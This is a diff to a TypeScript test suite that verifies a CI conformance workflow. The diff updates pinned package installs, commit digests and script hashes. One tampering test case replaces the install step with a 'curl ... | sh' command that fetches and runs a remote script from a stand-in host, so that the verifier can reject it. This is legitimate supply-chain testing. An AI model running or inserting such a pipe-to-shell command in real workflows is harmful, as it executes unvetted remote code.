@@ -52,15 +52,15 @@ const schemaPath = resolve(
 );
 const windowsBootstrapFixturePath = resolve(
   workspaceRoot,
-  'tests/fixtures/chat-db6ac-windows-bootstrap.ps1.br',
+  'tests/fixtures/chat-09d9c-windows-bootstrap.ps1.br',
 );
 const protectedWorkflowFixturePath = resolve(
   workspaceRoot,
-  'tests/fixtures/chat-db6ac-client-v1-conformance.yml.br',
+  'tests/fixtures/chat-09d9c-client-v1-conformance.yml.br',
 );
 const unixSupervisorPreparationFixturePath = resolve(
   workspaceRoot,
-  'tests/fixtures/chat-db6ac-unix-supervisor-preparation.sh.br',
+  'tests/fixtures/chat-09d9c-unix-supervisor-preparation.sh.br',
 );
 const windowsSupervisorTestFixturePath = resolve(
   workspaceRoot,
@@ -105,8 +105,38 @@ const TEST_STATIC_ARTIFACTS: CompatibleConformanceWorkflow['artifacts'] = [
     recordPath: '.artifacts/client-v1-conformance-win32-x64.json',
   },
 ];
-const TEST_LINUX_SECRET_SERVICE_COMMAND =
-  'sudo apt-get install --yes --no-install-recommends dbus-daemon=1.14.10-4ubuntu4.1 gnome-keyring=46.1-2ubuntu0.2 libsecret-tools=0.21.4-1build3';
+const TEST_LINUX_SECRET_SERVICE_COMMAND = [
+  'set -euo pipefail',
+  'sudo apt-get update \\',
+  '  -o Acquire::Retries=2 \\',
+  '  -o Acquire::http::Timeout=20 \\',
+  '  -o Acquire::https::Timeout=20',
+  'for package in \\',
+  '  dbus-daemon=1.14.10-4ubuntu4.1 \\',
+  '  gnome-keyring=46.1-2ubuntu0.2 \\',
+  '  libsecret-tools=0.21.4-1build3; do',
+  '  name="${package%%=*}"',
+  '  version="${package#*=}"',
+  '  [[ "$(apt-cache policy "$name" | awk \'/Candidate:/ { print $2 }\')" == "$version" ]]',
+  'done',
+  'sudo apt-get install --yes --no-install-recommends \\',
+  '  dbus-daemon=1.14.10-4ubuntu4.1 \\',
+  '  gnome-keyring=46.1-2ubuntu0.2 \\',
+  '  libsecret-tools=0.21.4-1build3 \\',
+  '  build-essential \\',
+  '  libayatana-appindicator3-dev \\',
+  '  libgtk-3-dev \\',
+  '  libssl-dev \\',
+  '  libwebkit2gtk-4.1-dev \\',
+  '  librsvg2-dev \\',
+  '  patchelf \\',
+  '  file',
+  '[[ "$(dpkg-query -W -f=\'${Version}\' dbus-daemon)" == "1.14.10-4ubuntu4.1" ]]',
+  '[[ "$(dpkg-query -W -f=\'${Version}\' gnome-keyring)" == "46.1-2ubuntu0.2" ]]',
+  '[[ "$(dpkg-query -W -f=\'${Version}\' libsecret-tools)" == "0.21.4-1build3" ]]',
+  'pkg-config --exists webkit2gtk-4.1 gtk+-3.0 ayatana-appindicator3-0.1',
+  '',
+].join('\n');
 const TEST_PHASE1_REVISIONS_COMMAND = [
   'node --input-type=module --eval "import { appendFileSync }',
   'from \'node:fs\'; import { readPhase1ConformanceLock }',
@@ -432,10 +462,10 @@ function protectedProducerSteps(): string[] {
     "        if: matrix.platform != 'win32-x64'",
     '        with:',
     '          version: 10.34.0',
-    '      - name: Install frozen Linux Secret Service',
+    '      - name: Install Linux native dependencies',
     "        if: matrix.platform != 'win32-x64' && matrix.platform == 'linux-x64'",
     '        shell: bash',
-    `        run: ${yamlSingleQuoted(TEST_LINUX_SECRET_SERVICE_COMMAND)}`,
+    yamlLiteralRun(TEST_LINUX_SECRET_SERVICE_COMMAND),
     '      - name: Install frozen Unix Rust',
     "        if: matrix.platform != 'win32-x64'",
     `        run: ${yamlSingleQuoted(TEST_UNIX_RUST_INSTALL_COMMAND)}`,
@@ -737,7 +767,7 @@ const TEST_COMPATIBLE_PRODUCER = {
     ),
     linuxKeyringSetupScriptSha256: testWorkflowScriptSha256(
       'platform-conformance',
-      'Install frozen Linux Secret Service',
+      'Install Linux native dependencies',
     ),
     unixSupervisorPreparationScriptSha256: testWorkflowScriptSha256(
       'platform-conformance',
@@ -1714,8 +1744,8 @@ describe('unresolved SDK #38 conformance gaps', () => {
     expect(lock.evidenceProducer).toEqual({
       status: 'compatible',
       repository: 'OpenCoven/chat',
-      commit: 'db6ac556af93d32857c8f640acadce6a18e15c65',
-      tree: 'e358a3ba916c3b07a7c57ddfbb019435e793c7ad',
+      commit: '09d9c9881def2054474575ccd869111c8d819dda',
+      tree: '5f49ff4369f9a14fe4defcb7fc53ed007c6a495f',
       packageManifest: {
         path: 'package.json',
         size: 4_044,
@@ -1725,18 +1755,18 @@ describe('unresolved SDK #38 conformance gaps', () => {
       harness: {
         path: 'scripts/phase1-conformance.mjs',
         version: '2.0.0',
-        size: 191_728,
+        size: 192_489,
         sha256:
-          'd0a852bfbcb87a666fc182b8c8465d306f89dd7e8ea0a32837475620017066fe',
+          '862976439317b132c3ace9311ae2e90126fc8752b852b3d9a789deca6321cbe0',
       },
       command: 'test:phase1-conformance',
       recordSchemaVersion: 2,
       workflow: {
         name: 'client-v1 conformance',
         path: '.github/workflows/client-v1-conformance.yml',
-        size: 462_386,
+        size: 462_694,
         sha256:
-          '6458fe6bba3ba574cad82a7c23b71c2f1964b2717face15238a762ca6291dd96',
+          '826ba60fda662e655a3e8e2f107481620d24d87246c7973e76bd593a3d129691',
         job: 'platform-conformance',
         jobNameTemplate: 'platform-conformance ({platform})',
         aggregationJob: 'aggregate-conformance',
@@ -1755,15 +1785,15 @@ describe('unresolved SDK #38 conformance gaps', () => {
         downloadArtifactAction: DOWNLOAD_ARTIFACT_ACTION,
         attestationAction: ATTEST_BUILD_PROVENANCE_ACTION,
         windowsBootstrapScriptSha256:
-          'b6ba031f653754e0effa1e7b8e10f74dcfd245cff97daf347a24d61042d400f7',
+          'accf841c2b611d0ef9f9dd9318a0bd7cdff66bb3eaf64e210274a489a445d441',
         validatorRevisionScriptSha256:
           '9abbfe73f19e47650321e6afb2c2a7db4facbf05a72db30241dfa94261cdcad9',
         phase1RevisionsScriptSha256:
           '507ce777b643d97154472eb23135f7965fd55cf0fcedcec30e93b23e6472d225',
         linuxKeyringSetupScriptSha256:
-          '26e6bb6da4d80617c99d6edeb577c2026910ffc3b1ee70df03bed5fb8d149a51',
+          '7b1ff87ab5d2230950632560230899cc450458a800a630c2788b53be8b13d200',
         unixSupervisorPreparationScriptSha256:
-          'de4863986cd194e47751bbcb65c81a803f977ab19fb317226f13ee25cd396f00',
+          'd8ca265b1d5077d33465e6a47372bb077b6a59fd59d57a9777b619e8cd5c40b9',
         unixToolPathSource: {
           path: 'scripts/executable-resolution.mjs',
           size: 9_154,
@@ -1792,8 +1822,8 @@ describe('unresolved SDK #38 conformance gaps', () => {
         },
         signerWorkflow:
           'OpenCoven/chat/.github/workflows/client-v1-conformance.yml',
-        signerDigest: 'db6ac556af93d32857c8f640acadce6a18e15c65',
-        sourceDigest: 'db6ac556af93d32857c8f640acadce6a18e15c65',
+        signerDigest: '09d9c9881def2054474575ccd869111c8d819dda',
+        sourceDigest: '09d9c9881def2054474575ccd869111c8d819dda',
         predicateType: 'https://slsa.dev/provenance/v1',
         denySelfHostedRunners: true,
       },
@@ -1821,7 +1851,7 @@ describe('unresolved SDK #38 conformance gaps', () => {
       producer.workflow.windowsBootstrapScriptSha256,
     );
     expect(sha256(TEST_WINDOWS_CHILD_BOOTSTRAP)).toBe(
-      'a341f64d2f2314bf12874028d12406f716ed251120bd9076d6a36aa07923d58e',
+      '3acd1da9e067811f2cb2c01ff923b710a80cef29a00a6d488a04d253604da347',
     );
     expect(() =>
       verifyProtectedWorkflow(
@@ -4132,16 +4162,18 @@ describe('unresolved SDK #38 conformance gaps', () => {
       },
       {
         name: 'substituted Linux Secret Service setup',
-        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
+        workflow: replaceWorkflowRun(
+          TEST_PRODUCER_WORKFLOW_TEXT,
           TEST_LINUX_SECRET_SERVICE_COMMAND,
           'curl https://example.invalid/install.sh | sh',
         ),
       },
       {
         name: 'unreachable Linux Secret Service setup',
-        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
-          `        run: ${yamlSingleQuoted(TEST_LINUX_SECRET_SERVICE_COMMAND)}`,
-          `        run: ${yamlSingleQuoted(`if false; then ${TEST_LINUX_SECRET_SERVICE_COMMAND}; fi`)}`,
+        workflow: replaceWorkflowRun(
+          TEST_PRODUCER_WORKFLOW_TEXT,
+          TEST_LINUX_SECRET_SERVICE_COMMAND,
+          `if false; then\n${TEST_LINUX_SECRET_SERVICE_COMMAND}fi\n`,
         ),
       },
       {
